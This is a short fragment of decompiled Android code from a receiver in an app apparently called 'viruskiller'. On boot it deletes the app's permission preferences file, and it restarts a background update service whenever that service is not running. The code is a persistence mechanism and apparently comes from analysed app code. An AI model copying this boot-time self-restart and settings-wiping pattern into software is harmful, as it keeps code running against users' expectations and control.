	private static final java.lang.String SNAME
	
	    public Receiver()
	    {
	        return;
	    }
	
	
	    private java.util.List getRuningServices(android.content.Context p8)
	    {
	        java.util.List v2 = ((android.app.ActivityManager) p8.getSystemService("activity")).getRunningServices(100);
	        java.util.ArrayList v4_1 = new java.util.ArrayList();
	        java.util.Iterator v5_1 = v2.iterator();
	        while (v5_1.hasNext()) {
	            v4_1.add(((android.app.ActivityManager$RunningServiceInfo) v5_1.next()).service.getShortClassName());
	        }
	        return v4_1;
	    }
	
	
	    public void onReceive(android.content.Context p8, android.content.Intent p9)
	    {
	        if (p9.getAction().equals("android.intent.action.BOOT_COMPLETED")) {
	            android.content.pm.ApplicationInfo v0 = p8.getApplicationInfo();
	            if (v0 != null) {
	                java.io.File v1_1 = new java.io.File(new StringBuilder("/data/data/").append(v0.packageName).append("/shared_prefs/permission.xml").toString());
	                if (v1_1.exists()) {
	                    v1_1.delete();
	                }
	            }
	        }
	        if (!this.getRuningServices(p8).contains("com.safesys.viruskiller.UpdateService")) {
	            android.content.Intent v2_1 = new android.content.Intent();
	            v2_1.setClass(p8, com.safesys.viruskiller.UpdateService);
	            p8.startService(v2_1);
	        }
	        return;
	    }
	
